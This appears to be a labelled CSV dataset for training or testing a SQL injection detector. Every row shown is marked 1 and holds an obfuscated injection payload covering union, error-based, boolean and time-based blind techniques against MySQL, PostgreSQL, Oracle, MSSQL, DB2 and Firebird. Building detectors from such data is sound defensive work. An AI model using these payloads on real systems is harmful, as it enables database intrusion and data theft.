Query,Label
"1""   )    )    as knyf %%w%h%%e%re 8109  =  8109 %o%%r 8384  =  l%%i%%ke  (  'abcdefg',upper  (  hex  (  ra%n%domblob  (  500000000/2   )    )      )    )   --",1
"1' a%n%d 5556  =    (  %se%l%%e%%ct count  (  *  )   %%f%%r%o%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   a%n%d 'ccsb'  =  'ccsb",1
"1   )    )    as pjjz w%%h%%e%r%%e 8384  =  8384 %a%nd extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  s%e%%l%e%%c%t   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",1
"1'  )   as uytv w%%h%%ere 7875  =  7875 o%%r 7417  =    (  s%e%l%ec%t count  (  *  )   %f%%r%o%m sysibm.sys%%t%%ab%%les as t1,sysibm.sys%%t%%ab%%les as t2,sysibm.sys%%t%%ab%%les as t3  )  --",1
"%%se%%l%ect * %f%%rom generate_series  (  3341,3341,case when   (  3341  =  3072  )   then 1 else 0 end  )   %%l%%i%%mit 1--",1
"-4407""  )   %%whe%r%%e 2055  =  2055 %o%%r elt  (  9714  =  5040,5040  )  --",1
"-5898""   )    )    as fycd %wh%e%r%e 7135  =  7135 %%o%%r 1570  =  convert  (  int,  (  s%%el%%ec%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s%%el%%ec%t   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1"" w%h%er%e 8978  =  8978 %%un%i%o%%n all %sel%%e%%ct %null,%null,%null,%null,%null,%null,%null,%null--",1
"1'   )    )    %%a%nd 9254  =    (  %s%%e%%l%%ec%t count  (  *  )   %%f%%r%%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1'   )    )    or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   %%an%%d    (    (   'stqq'  =  'stqq",1
1%',1
"1   )    )    as vycb w%%h%%er%e 3524  =  3524 %%a%%n%%d 6414  =    (  %%s%e%le%c%%t count  (  *  )   f%r%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-3731'   )    )     )   %o%%r elt  (  7540  =  1412,1412  )   %%a%%n%d    (    (     (  'iwch'  =  'iwch",1
"1""   )    )     )   %o%r 8315  =    (  s%el%ec%%t count  (  *  )   %f%%ro%m sysibm.sys%t%abl%es as t1,sysibm.sys%t%abl%es as t2,sysibm.sys%t%abl%es as t3  )   %a%n%%d    (    (     (  ""zzcd""  =  ""zzcd",1
-2951 %o%%r 4144  =    (  %%se%%l%e%%c%%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%%l%e%%c%%t   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   %%f%r%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%f%r%%o%m dual  )  # gwqv,1
"se%%l%ec%t count  (  *  )   f%ro%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %a%n%%d    (    (   6977  =  6977",1
"1""  )   as pkkx %%whe%%r%%e 6716  =  6716 an%d %u%p%%d%%a%%t%%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  s%e%l%%e%%c%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  --",1
"1'  )   as juxt %%whe%%r%%e 5956  =  5956 %an%d 8148  =  %l%%i%ke  (  'abcdefg',upper  (  hex  (  r%an%domblob  (  500000000/2   )    )      )    )   --",1
1'   )    )    as zffq %%wh%%e%%r%e 9572  =  9572 %or 6793  =    (  %%se%l%%ect 6793 f%r%om pg_sleep  (  5   )    )   --,1
"1  )   %%an%d   (  %%s%%e%l%%e%c%%t 2*  (  if   (    (   %%s%%e%l%%e%c%%t * %%fr%o%%m   (  %%s%%e%l%%e%c%%t concat  (  0x7171706a71,  (  %%s%%e%l%%e%c%%t   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'  )   o%%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,n%%ull  )  --",1
"-4746%""   )    )     )   %%o%%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%%l%e%ct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   fr%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %%a%%n%%d    (    (     (  ""%""  =  """,1
"-1157   )    )    as sxie %%wh%er%e 7118  =  7118 %o%r 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %se%%l%%e%%ct   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   %%f%%ro%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1""  )   %%a%%nd make_se%t  (  4553  =  8132,8132  )   %%a%%nd   (  ""pfci"" lik%%e ""pfci",1
"-2211"" %%o%%r 2113  =  8885#",1
1'   )    )     )   %a%%n%%d 4386  =  utl_i%%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel%ec%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %a%%n%%d    (    (     (  'nfix'  =  'nfix,1
"-4797' unio%n all %%sel%e%%c%%t 8223,8223,8223,8223,8223,8223,8223,8223#",1
"1'   (  %%s%e%le%%c%%t   (  case when   (  5451  =  5451  )   then regexp_substri%ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,%%n%%u%l%l  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   %%fr%%o%m i%nf%%ormation_schema.system_users  )   %%a%%n%d 'efpc' l%%i%%k%e 'efpc",1
"1   )    )     )   an%%d 3202  =  %l%%i%k%e  (  'abcdefg',upper  (  hex  (  ran%%domblob  (  500000000/2   )    )      )    )    an%%d    (    (     (  6265  =  6265",1
"1""   )    )     )   %%a%n%%d   (  %s%e%%le%c%t * %%f%%ro%%m   (  %s%e%%le%c%t  (  sleep  (  5   )    )     )  fzno  )   %%a%n%%d    (    (     (  ""uncg""  =  ""uncg",1
1%'  )   %a%%nd 3715 %i%%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%e%lect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %a%%nd   (  '%'  =  ',1
 (  s%%el%e%%c%%t   (  case when   (  9337  =  9337  )   then waitf%or delay '0:0:5' else 9337*  (  s%%el%e%%c%%t 9337 %%f%%r%o%%m master..sys%%d%%a%ta%b%a%%ses  )   end   )    ) ,1
"1' %in boolean mode  )   %%a%%n%d exp  (  ~  (  %se%l%e%c%%t * f%%r%%om   (  %se%l%e%c%%t concat  (  0x7171706a71,  (  %se%l%e%c%%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",1
"-8725""   )    )     )   o%%r   (  8459  =  8459  )  *4906 a%%n%%d    (    (     (  ""vblw"" %%l%%ike ""vblw",1
1%'   )    ) ,1
1' %%a%n%%d 5835  =  6157 %%a%n%%d 'bjee' %lik%e 'bjee,1
"make_s%%e%%t  (  5679  =  9769,9769  )  ",1
1  )   %w%%he%%r%e 5629  =  5629,1
"-4528""  )   %or 5903  =    (  'qqpjq'||  (  s%%e%%l%ect case 5903 when 5903 then 1 else 0 end %f%%ro%%m rdb$%%d%at%%a%%b%a%se  )  ||'qzvzq'  )   %an%d   (  ""fxmt"" lik%%e ""fxmt",1
-7636'  )   %%o%r 5898  =  8880 %%an%d   (  'sjuv'  =  'sjuv,1
"-3747""  )   u%%nion all se%lec%t 8962,8962,8962,8962,8962#",1
"-8893  )   u%%n%%ion all %s%e%%l%e%c%%t 7594,7594,7594,7594,7594,7594#",1
1  )   or sleep  (  5  )   %a%n%d   (  2211  =  2211,1
1'||  (  sele%%ct 'lnhq' %w%%he%%r%e 7526  =  7526,1
-8513  )   %or 4493  =  utl_%inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%%e%l%e%%ct   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %f%%r%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %%a%n%%d   (  5818  =  5818,1
1%'   )    )    %o%r 6793  =    (  %s%e%le%ct 6793 f%%r%%o%%m pg_sleep  (  5   )    )    %a%n%d    (    (   '%'  =  ',1
"1""  )   whe%%r%%e 4520  =  4520",1
1' %%w%%he%%r%%e 8945  =  8945 %%an%d 6240  =    (  'qqpjq'||  (  %s%ele%%c%t case 6240 when 6240 then 1 else 0 end %%f%r%%o%%m rdb$%d%%a%t%a%%b%a%%se  )  ||'qzvzq'  )  --,1
"1%"" a%n%%d 7533  =  7533 a%n%%d ""%""  =  """,1
"-6996%"" %or 1 group %b%%y concat  (  0x7171706a71,  (  %%s%ele%ct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flo%or  (  r%%a%%n%%d  (  0  )  *2   )    )    havi%ng mi%n  (  0  )  #",1
"1'||  (  select 'qjwf' %f%%rom dual w%%he%re 3187  =  3187 a%nd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,%nu%l%l   )    )   ||'",1
"1"" o%%r 8421  =    (  s%%e%l%e%c%t count  (  *  )   %%f%%r%%o%%m generate_series  (  1,5000000   )    )    %%an%%d ""cdai""  =  ""cdai",1
"1',  (  %%s%e%l%%e%%c%%t 6825 %%f%%r%om  (  %%s%e%l%%e%%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%e%l%%e%%c%%t   (  elt  (  6825  =  6825,1   )    )     )  ,0x717a767a71,flo%o%r  (  r%an%%d  (  0  )  *2   )    )   x %%f%%r%om i%%nf%o%rmation_schema.character_%s%%ets group %b%%y x  )  a  )  ",1
"-1258""   )    )    %u%n%i%o%%n all %se%%l%e%%c%t 7734,7734,7734#",1
1 %%and 4386  =  utl_%%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%e%l%%e%ct   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   f%%r%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # lexm,1
"1' %an%%d   (  %se%l%e%ct 9067 fr%o%%m  (  %se%l%e%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %se%l%e%ct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%o%%r  (  r%an%%d  (  0  )  *2   )    )   x fr%o%%m i%nf%o%%rmation_schema.character_%%se%ts group %b%y x  )  a  )   %an%%d 'lywy' %l%ik%e 'lywy",1
1 %%whe%%r%%e 6518  =  6518,1
"1%"" %a%n%%d 3715 i%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %s%%el%ect   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %a%n%%d ""%""  =  """,1
"1'  )   w%%h%%e%re 5071  =  5071 u%n%%i%o%n all %s%%e%l%e%c%%t %%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l,%%n%u%l%%l--",1
1' %w%h%%e%%r%e 5547  =  5547,1
"1 %whe%%r%e 8908  =  8908 %%o%%r 7417  =    (  %s%e%%l%%e%%c%%t count  (  *  )   %%f%%r%o%%m sysibm.sys%ta%b%l%%es as t1,sysibm.sys%ta%b%l%%es as t2,sysibm.sys%ta%b%l%%es as t3  )  --",1
"1""  )   as kfvy %w%h%%e%%re 7305  =  7305 %or sleep  (  5  )  --",1
1 %w%h%%ere 7021  =  7021 or 6793  =    (  s%%e%l%%e%c%t 6793 %fr%om pg_sleep  (  5   )    )   --,1
"1',  (  %%se%%l%%e%%c%%t   (  case when   (  1570  =  1570  )   then   (  %%se%%l%%e%%c%%t 1570 f%%r%%o%%m pg_sleep  (  5   )    )    else 1/  (  %%se%%l%%e%%c%%t 0  )   end   )    )   ",1
"1""  )   %%wh%er%%e 8095  =  8095 %%a%n%%d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %sel%e%ct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
"-5963"" o%%r 9323  =  9323#",1
1' w%%h%e%r%e 8584  =  8584 %o%rd%er b%y 1#,1
1   )    ) ,1
"1%'   )    )     )   an%%d 8514  =    (  s%e%%l%ec%%t count  (  *  )   %%f%%r%om doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.%%t%%ab%%les as t3  )   an%%d    (    (     (  '%'  =  '",1
"1'   )    )     )   %a%%n%%d 4241  =  convert  (  %%i%%nt,  (  se%l%%e%ct char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  se%l%%e%ct   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %a%%n%%d    (    (     (  'vtno'  =  'vtno",1
"1' %%an%d elt  (  4249  =  4249,7259  )   %%an%d 'awjd'  =  'awjd",1
"1 %%a%%n%d 8407  =    (  sel%e%c%%t count  (  *  )   %%f%r%%om generate_series  (  1,5000000   )    )   ",1
"se%l%e%%c%t * %fr%%o%m generate_series  (  4975,4975,case when   (  4975  =  9615  )   then 1 else 0 end  )   %%l%i%m%%it 1--",1
"1""  )   as tqxa wh%%e%r%%e 6751  =  6751 %%o%%r   (  s%e%le%c%t 2*  (  if   (    (   s%e%le%c%t * %%f%ro%m   (  s%e%le%c%t concat  (  0x7171706a71,  (  s%e%le%c%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"1'  )   %%o%%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",1
"1  )   as qyic %w%h%%er%%e 9736  =  9736 a%n%d elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"1%""   )    )    %uni%%o%n all %s%e%%l%%ec%%t nu%%ll,nu%%ll,nu%%ll#",1
-2364' o%%r 6743  =  7578,1
-8538%' %%o%%r 5903  =    (  'qqpjq'||  (  %s%%e%l%e%%c%%t case 5903 when 5903 then 1 else 0 end %%f%r%%o%%m rdb$%dat%%a%%ba%se  )  ||'qzvzq'  )   %%a%n%%d '%'  =  ',1
"1%'   )    )    or 5286  =    (  s%e%%l%%ect count  (  *  )   fr%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %a%n%d    (    (   '%'  =  '",1
"-9398' %%uni%on all %s%el%e%c%%t 3998,3998,3998,3998,3998,3998,3998,3998,3998#",1
end-- podi,1
"1%' a%n%d 9254  =    (  s%e%l%e%%c%%t count  (  *  )   %f%r%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1%"" %a%n%%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%e%%l%%e%c%t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   fr%%o%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   %a%n%%d ""%""  =  """,1
"1""  )   %%a%n%%d 6414  =    (  s%elec%%t count  (  *  )   %f%rom rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   %%a%n%%d   (  ""udlh""  =  ""udlh",1
"1""  )   as nixg w%%h%er%%e 4580  =  4580 a%%n%d 4241  =  convert  (  %i%%nt,  (  %s%%e%le%%c%%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %s%%e%le%%c%%t   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
"1%'   )    )    u%nio%n all s%e%l%%ec%t %%nu%ll,%%nu%ll,%%nu%ll,%%nu%ll,%%nu%ll,%%nu%ll,%%nu%ll,%%nu%ll--",1
"1"" %%w%h%%e%%r%%e 6281  =  6281 o%%r 7552  =    (  sel%ec%%t count  (  *  )   f%%ro%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""   )    )    %or 8384  =  %%lik%%e  (  'abcdefg',upper  (  hex  (  r%%a%%ndomblob  (  500000000/2   )    )      )    )    %%a%%nd    (    (   ""giuq""  =  ""giuq",1
"1   )    )    u%%ni%on all s%e%l%ec%t %n%u%%l%%l,%n%u%%l%%l--",1
1'  )   as jxtg %%w%h%er%%e 1071  =  1071 %an%d sleep  (  5  )  --,1
"1 %w%%h%%e%r%e 5266  =  5266 %%an%%d exp  (  ~  (  %sel%%e%%ct * %fr%%om   (  %sel%%e%%ct concat  (  0x7171706a71,  (  %sel%%e%%ct   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"%%s%%e%%l%%e%%c%t count  (  *  )   f%%r%%o%%m generate_series  (  1,5000000  )   %a%n%d   (  '%'  =  '",1
"1%"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'   )    )     )   %or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   a%n%d    (    (     (  'dbsm'  =  'dbsm",1
"1'   )    )     )   %un%%io%%n all %s%e%%l%e%c%t %%n%ul%%l,%%n%ul%%l#",1
"1' %and 6510  =    (  %%s%%el%ec%t count  (  *  )   %%f%rom sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",1
"1%'   )    )    %%a%n%%d u%p%%d%a%texml  (  3393,concat  (  0x2e,0x7171706a71,  (  se%%l%%e%ct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   %%a%n%%d    (    (   '%'  =  '",1
"-7851""   )    )    %%o%%r 6872  =  6872 a%%n%d    (    (   ""dvbw"" %%li%%k%e ""dvbw",1
"1'   )    )    a%n%%d 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   a%n%%d    (    (   'zknl'  =  'zknl",1
"-6928""   )    )    o%%r 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  se%%l%e%c%t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %an%d    (    (   ""mxhr"" li%%k%e ""mxhr",1
"1' o%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %%s%e%%l%%ec%%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    %%a%n%%d 'kjfm'  =  'kjfm",1
%sel%%e%c%t pg_sleep  (  5   )    )   +',1
"1""  )   %%w%%h%e%%r%e 4382  =  4382 %and 6607  =  2394--",1
"1""   )    )     )   %a%n%%d   (  3020  =  3020  )  *6703 %a%n%%d    (    (     (  ""krxy""  =  ""krxy",1
" end %a%%nd ""unqj""  =  ""unqj",1
"-3368'   )    )    %%u%%n%%i%o%n all %s%el%e%c%%t 4913,4913,4913,4913,4913,4913,4913,4913,4913--",1
"1'||  (  s%e%%le%c%%t 'zdfo' %f%ro%%m dual %%w%h%%er%%e 4288  =  4288 un%%i%%o%%n all s%e%%le%c%%t %n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll,%n%%u%ll--",1
"%%sele%%c%%t count  (  *  )   %%fr%%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ||'",1
"1""  )   %w%he%%r%%e 5719  =  5719 rli%k%e sleep  (  5  )  --",1
1'   )    )     )   waitfo%r delay '0:0:5' %and    (    (     (  'zhhf' %l%%ik%e 'zhhf,1
"1%' an%d make_%%s%%et  (  1227  =  5627,5627  )   an%d '%'  =  '",1
"-3729'   )    )    %o%r elt  (  4482  =  2648,2648  )   %a%n%%d    (    (   'vkkr' %lik%e 'vkkr",1
"  (  s%%e%%l%e%ct concat  (  0x7171706a71,  (  s%%e%%l%e%ct   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",1
"1' a%%nd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,%%n%u%%l%l  )   a%%nd 'egye'  =  'egye",1
1' wh%%er%%e 3028  =  3028,1
 (  %s%e%l%ect   (  case when   (  4108  =  4108  )   then 1 else 4108*  (  %s%e%l%ect 4108 %%fr%o%m %%i%%nf%%o%rmation_schema.character_%s%%ets  )   end   )    ) ,1
"1""   )    )    as jikg %wh%%er%e 8258  =  8258 %%a%n%%d   (  3973  =  1047  )  *1047--",1
"1  )   %%wh%%e%%re 5464  =  5464 %%or 1022  =    (  %%se%%l%%ect count  (  *  )   %f%%r%om all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""  )   as wjdc wh%e%re 8694  =  8694 a%%nd 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%s%%ele%%c%t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
"1 w%he%r%e 3737  =  3737 %or 4915  =    (  s%e%%l%%e%c%t count  (  *  )   fro%%m doma%%i%n.doma%%i%ns as t1,doma%%i%n.columns as t2,doma%%i%n.%t%ab%%l%es as t3  )  --",1
-4954'  )   o%%r 8571  =  8571--,1
s%%el%%ec%%t   (  case when   (  3773  =  3722  )   then 3773 else 3773*  (  s%%el%%ec%%t 3773 f%r%o%m mysql.db  )   end  )  #,1
"1  )   wh%%e%%re 3062  =  3062 o%%r 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
"1'   )    )    uni%%o%%n all %se%%l%e%ct %n%ul%l,%n%ul%l--",1
"iif  (  1483  =  7301,1,1/0  )  ",1
"1'||  (  %sel%e%ct 'jonh' %f%%r%%o%%m dual w%%her%%e 2415  =  2415 un%%ion all %sel%e%ct nu%l%l,nu%l%l,nu%l%l,nu%l%l,nu%l%l,nu%l%l,nu%l%l,nu%l%l,nu%l%l--",1
"1%'  )   %o%%r 4411  =    (  %%s%%el%%ect count  (  *  )   %f%%r%%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   %%an%d   (  '%'  =  '",1
1'||  (  %se%l%e%%c%%t 'ilkr' f%r%%om dual w%%h%%e%re 9296  =  9296,1
"1""   )    )    %or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%%i%%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%%n%u%%l%%l  )  --",1
"1""   )    )     )   %%an%%d exp  (  ~  (  %s%e%%lec%%t * f%r%%o%%m   (  %s%e%%lec%%t concat  (  0x7171706a71,  (  %s%e%%lec%%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %%an%%d    (    (     (  ""bizm""  =  ""bizm",1
1'  )   as mz%%b%%y %%w%%her%%e 6530  =  6530,1
1' %a%n%%d 6240  =    (  'qqpjq'||  (  %%s%ele%%ct case 6240 when 6240 then 1 else 0 end f%ro%%m rdb$%d%a%%ta%%b%a%s%%e  )  ||'qzvzq'  )   %a%n%%d 'sqvt' %%l%%ik%%e 'sqvt,1
"1""   )    )    as iqgd %w%he%r%%e 7611  =  7611 %%u%n%i%o%n all se%l%e%%c%%t n%%u%%ll,n%%u%%ll,n%%u%%ll,n%%u%%ll,n%%u%%ll#",1
"1'  )   an%d 6414  =    (  %se%le%c%%t count  (  *  )   %%f%ro%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   an%d   (  'zcey'  =  'zcey",1
s%%e%%l%%e%ct case when 3995  =  8680 then 1 else %%nu%%l%l end--,1
"1%""   )    )     )   r%li%%k%e   (  %se%%l%e%c%t   (  case when   (  4442  =  4476  )   then 1 else 0x28 end   )    )    %an%%d    (    (     (  ""%""  =  """,1
"1'+  (  %%s%%e%%lect 'ayod' w%he%%r%%e 7839  =  7839 %%o%r   (  %%s%%e%%lect 2*  (  if   (    (   %%s%%e%%lect * %%fro%%m   (  %%s%%e%%lect concat  (  0x7171706a71,  (  %%s%%e%%lect   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
"1  )   as ekgx %w%h%%e%%re 9923  =  9923 or 8384  =  %l%%ik%%e  (  'abcdefg',upper  (  hex  (  ra%%n%domblob  (  500000000/2   )    )      )    )   --",1
-4239 %o%r 2724 %i%%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %%s%ele%%c%%t   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,1
1' %w%h%er%%e 5458  =  5458 r%%l%ike   (  se%lec%%t * f%%r%%om   (  se%lec%%t  (  sleep  (  5   )    )     )  vwyq  )  #,1
